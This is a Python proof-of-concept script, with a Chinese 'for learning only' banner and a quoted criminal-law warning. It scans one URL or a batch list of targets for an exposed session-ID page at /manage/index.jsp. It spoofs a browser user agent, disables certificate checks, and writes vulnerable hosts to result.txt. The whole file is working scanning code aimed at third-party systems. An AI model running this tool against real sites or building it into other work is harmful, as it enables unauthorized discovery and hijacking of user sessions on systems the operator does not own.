import requests
import argparse
from datetime import datetime
import time
requests.packages.urllib3.disable_warnings()

RED_BOLD = "\033[1;31m"
RESET = "\033[0m"
def usage():
    global RED_BOLD
    global RESET
    text = '''
    -----------------------------------------------------------------+
    _              _             
   / \   _ __ ___ (_) ___ __ _   
  / _ \ | '_ ` _ \| |/ __/ _` |  
 / ___ \| | | | | | | (_| (_| |_ 
/_/   \_\_| |_| |_|_|\___\__,_(_)
    +                          此脚本仅用于学习                          +
    使用方法:
        单个 python SESSION.py -u url[例 http://127.0.0.1:8080]
        批量 python3 SESSION.py -r filename
    +-----------------------------------------------------------------+         

    根据《中华人民共和国刑法》第二百八十六条规定，违反国家规定，对计算机信息系统功能进行\n删除、修改、增加、干扰，造成计算机信息系统不能正常运行的，处五年以下有期徒刑\n或者拘役；后果特别严重的，处五年以上有期徒刑。
    违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行\n删除、修改、增加的操作，后果严重的，依照前款的规定处罚。
    开始检测................................
    '''
    print(f"{RED_BOLD}{text}{RESET}")


def save_file(url):
    with open('result.txt',mode='a',encoding='utf-8') as f:
        f.write(url+'\n')

def poc(check_url,flag):
    now_poc = datetime.now()
    global RED_BOLD
    global RESET
    url = check_url + "/manage/index.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47"
    }
    try:
        respnose = requests.get(url, headers=headers, timeout=3, verify=False)
        content = respnose.text
        if respnose.status_code == 200 and 'Session ID' in content:
            print(f'{RED_BOLD}[+]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t存在SESSION泄露漏洞{RESET}')
            print(f'{RED_BOLD}[+]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}漏洞地址为\t{check_url}/manage/index.jsp{RESET}')
            save_file(check_url)
        else:
            print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞不存在')

    except Exception as e:
        print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t无法访问，请检查目标站点是否存在')


def run(filepath):
    flag = 0
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        if 'http' in u:
            url = u
        elif 'https' in u:
            url = u
        else:
            url = 'http://' + u

        poc(url,flag)

def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="python SESSION.py -u url")
    parse.add_argument("-r", "--file", help="python SESSION.py -r file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    usage()
    time.sleep(1.5)
    if url is not None and filepath is None:
        flag = 1
        poc(url,flag)
    elif url is None and filepath is not None:
        run(filepath)
    else:
        usage()


if __name__ == '__main__':
    main()